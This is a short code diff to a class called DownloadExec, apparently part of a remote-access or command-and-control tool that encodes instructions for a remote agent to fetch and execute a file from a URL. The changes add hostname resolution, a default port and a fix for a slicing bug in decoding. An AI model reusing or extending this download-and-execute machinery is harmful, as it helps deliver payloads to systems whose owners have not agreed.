@@ -473,12 +473,20 @@ class DownloadExec(Command):
 
         url = urlparse.urlparse(self.url)
 
-        addr = netaddr.IPAddress(url.hostname)
+        try:
+            addr = netaddr.IPAddress(url.hostname)
+        except:
+            addr = netaddr.IPAddress(socket.gethostbyname(url.hostname))
+
         if not addr.version == 4:
             raise ValueError('IPv6 unsupported')
 
         addr = int(addr)
-        port = int(url.port)
+        if url.port:
+            port = int(url.port)
+        else:
+            port = 0
+
         path = url.path
 
         if len(path) > 16:
@@ -513,7 +521,7 @@ class DownloadExec(Command):
         port = ':{}'.format(port) if port else (
             '' if scheme in ('http', 'ftp', 'https') else 53
         )
-        path = data[bsize:plen]
+        path = data[bsize:bsize+plen]
         return DownloadExec('{}://{}{}{}'.format(
             scheme, host, port, path
         ), action, proxy), bsize+plen
